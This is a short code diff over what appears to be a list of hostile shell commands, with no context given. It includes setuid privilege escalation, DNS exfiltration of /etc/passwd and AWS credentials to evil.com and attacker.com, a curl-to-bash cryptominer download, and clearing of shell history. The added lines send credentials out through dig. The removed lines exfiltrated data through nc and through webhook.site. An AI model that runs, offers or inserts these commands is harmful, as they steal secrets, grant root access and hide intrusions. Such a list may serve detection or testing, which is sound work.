@@ -8,7 +8,7 @@ chmod u+s /usr/bin/find
 chmod 4755 /tmp/backdoor
 dig $(cat /etc/passwd | base64).evil.com
 nslookup $(whoami).attacker.com
+base64 -w0 ~/.aws/credentials | xargs -I{} dig {}.evil.com
+cat /etc/passwd | base64 | tr -d '\n' | xargs dig
 curl -sSL https://xmrig.com/download | bash
 history -c && rm -f ~/.bash_history
-cat ~/.aws/credentials | nc evil.com 1234
-curl https://webhook.site/abc123 -d "$(cat .env)"
